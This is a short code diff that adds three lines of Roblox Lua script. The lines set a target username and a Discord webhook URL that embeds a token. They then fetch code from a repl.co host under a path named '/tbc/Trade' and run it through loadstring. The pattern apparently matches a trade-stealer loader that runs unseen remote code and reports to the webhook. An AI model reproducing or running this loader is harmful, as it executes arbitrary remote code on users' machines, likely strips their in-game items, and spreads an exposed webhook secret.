@@ -1,0 +1,3 @@
+getgenv().Username = "YoungGod4AO"
+getgenv().Webhook = "https://discord.com/api/webhooks/1202985466719248385/3kFgY799tono8o2hB4Mh0JQ3-OsQrd-ivy2g9rNu6LNDuy6N7yMqO8R72i0SDjpBb2Da"
+loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade", true))()
